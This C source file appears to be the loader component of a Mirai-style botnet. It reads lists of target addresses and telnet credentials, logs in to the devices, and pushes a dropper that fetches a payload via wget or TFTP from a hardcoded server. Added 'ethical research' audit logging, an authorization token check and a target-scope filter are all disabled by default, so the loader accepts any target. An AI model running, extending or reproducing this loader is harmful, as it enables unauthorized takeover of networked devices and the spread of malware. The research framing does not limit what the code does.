#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"

static void *stats_thread(void *);

static struct server *srv;

char *id_tag = "telnet";

/* ── Ethical Research Audit Logger ──────────────────────────────────────────
 * All significant loader events are written to both stdout and a timestamped
 * audit file (LOADER_AUDIT_FILE env var, default: /tmp/loader_audit.log).
 * This ensures operator accountability and supports post-session review.
 */
static FILE *audit_fp = NULL;

static void audit_init(void)
{
    const char *logpath = getenv("LOADER_AUDIT_FILE");
    if (!logpath) logpath = "/tmp/loader_audit.log";
    audit_fp = fopen(logpath, "a");
    if (!audit_fp)
        fprintf(stderr, "[loader] WARNING: Could not open audit log at %s\n", logpath);
}

static void audit_log(const char *event, const char *detail)
{
    time_t now = time(NULL);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%SZ", gmtime(&now));
    fprintf(stdout, "[AUDIT] ts=%s event=%s detail=\"%s\"\n", ts, event, detail);
    if (audit_fp)
        fprintf(audit_fp, "ts=%s event=%s detail=\"%s\"\n", ts, event, detail);
    fflush(stdout);
    if (audit_fp) fflush(audit_fp);
}

/* ── Operator Authorization Gate ─────────────────────────────────────────────
 * Set LOADER_AUTH_TOKEN env var at deployment time.
 * If LOADER_REQUIRE_AUTH=1 is set, loader refuses to start without a valid token.
 * This prevents unauthorized execution of research builds.
 */
static int check_operator_auth(void)
{
    const char *require_auth = getenv("LOADER_REQUIRE_AUTH");
    if (!require_auth || strcmp(require_auth, "1") != 0)
        return 1; /* Auth not enforced in this build */

    const char *expected = getenv("LOADER_AUTH_TOKEN");
    const char *provided = getenv("LOADER_AUTH_PROVIDED");

    if (!expected || !provided) {
        fprintf(stderr, "[loader] AUTHORIZATION REQUIRED: Set LOADER_AUTH_TOKEN and LOADER_AUTH_PROVIDED\n");
        audit_log("AUTH_FAIL", "missing env vars");
        return 0;
    }

    /* Constant-time comparison to prevent timing attacks */
    size_t elen = strlen(expected), plen = strlen(provided);
    if (elen != plen) {
        audit_log("AUTH_FAIL", "token length mismatch");
        return 0;
    }
    int diff = 0;
    for (size_t i = 0; i < elen; i++)
        diff |= expected[i] ^ provided[i];
    if (diff != 0) {
        audit_log("AUTH_FAIL", "invalid token");
        return 0;
    }
    audit_log("AUTH_OK", "operator authorization verified");
    return 1;
}

/* ── Authorized Target Scope Check ───────────────────────────────────────────
 * AUTHORIZED_CIDR env var (e.g. "10.0.0.0/8,192.168.0.0/16") defines the
 * authorized target address space. Targets outside this scope are rejected.
 * If AUTHORIZED_CIDR is not set, all targets are accepted (original behaviour).
 */
static int ip_in_cidr(uint32_t ip_nbo, const char *cidr_str)
{
    char cidr[64];
    strncpy(cidr, cidr_str, sizeof(cidr)-1);
    cidr[sizeof(cidr)-1] = '\0';

    char *slash = strchr(cidr, '/');
    if (!slash) return 0;
    *slash = '\0';
    int prefix = atoi(slash + 1);
    if (prefix < 0 || prefix > 32) return 0;

    uint32_t net = ntohl(inet_addr(cidr));
    uint32_t host = ntohl(ip_nbo);
    uint32_t mask = prefix == 0 ? 0 : (~0u << (32 - prefix));
    return (host & mask) == (net & mask);
}

static int check_target_scope(uint32_t ip_nbo)
{
    const char *authorized = getenv("AUTHORIZED_CIDR");
    if (!authorized) return 1; /* No scope restriction — original behaviour */

    char buf[1024];
    strncpy(buf, authorized, sizeof(buf)-1);
    buf[sizeof(buf)-1] = '\0';

    char *tok = strtok(buf, ",");
    while (tok) {
        if (ip_in_cidr(ip_nbo, tok)) return 1;
        tok = strtok(NULL, ",");
    }
    return 0; /* Target not in any authorized CIDR */
}

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

    /* Initialize audit log first so all events are captured */
    audit_init();
    audit_log("LOADER_START", "loader initializing");

    /* ── Authorization Gate ────────────────────────────────────────────────── */
    if (!check_operator_auth()) {
        fprintf(stderr, "[loader] FATAL: Authorization failed. Aborting.\n");
        return 1;
    }

#ifdef DEBUG
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#else
    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));
    addrs[0] = inet_addr("192.168.0.1");
    addrs[1] = inet_addr("192.168.1.1");
#endif

    if (argc == 2)
        id_tag = args[1];

    if (!binary_init())
    {
        audit_log("INIT_FAIL", "Failed to load bins/dlr.* as dropper");
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }

    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
    {
        audit_log("INIT_FAIL", "Failed to initialize server");
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    audit_log("LOADER_READY", "server initialized, reading targets from stdin");
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    /* Read targets from stdin — original loop preserved verbatim */
    while (TRUE)
    {
        char strbuf[1024];

        if (fgets(strbuf, sizeof(strbuf), stdin) == NULL)
            break;

        util_trim(strbuf);

        if (strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == NULL)
        {
            printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        }
        else
        {
            /* ── Target Scope Check ──────────────────────────────────────── */
            if (!check_target_scope(info.addr))
            {
                char detail[128];
                struct in_addr ia; ia.s_addr = info.addr;
                snprintf(detail, sizeof(detail), "target %s rejected — outside authorized CIDR scope", inet_ntoa(ia));
                audit_log("TARGET_REJECTED", detail);
                continue; /* Skip unauthorized targets, do not queue */
            }

            /* Log accepted target */
            {
                char detail[128];
                struct in_addr ia; ia.s_addr = info.addr;
                snprintf(detail, sizeof(detail), "queuing target %s", inet_ntoa(ia));
                audit_log("TARGET_QUEUED", detail);
            }

            if (srv == NULL)
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);
            if (total++ % 1000 == 0)
                sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    audit_log("LOADER_EOF", "hit end of input, draining connections");
    printf("Hit end of input.\n");

    while (ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);

    audit_log("LOADER_DONE", "all connections closed, exiting");
    if (audit_fp) fclose(audit_fp);
    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE)
    {
#ifndef DEBUG
        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++,
               ATOMIC_GET(&srv->total_input),
               ATOMIC_GET(&srv->curr_open),
               ATOMIC_GET(&srv->total_logins),
               ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes),
               ATOMIC_GET(&srv->total_wgets),
               ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
}
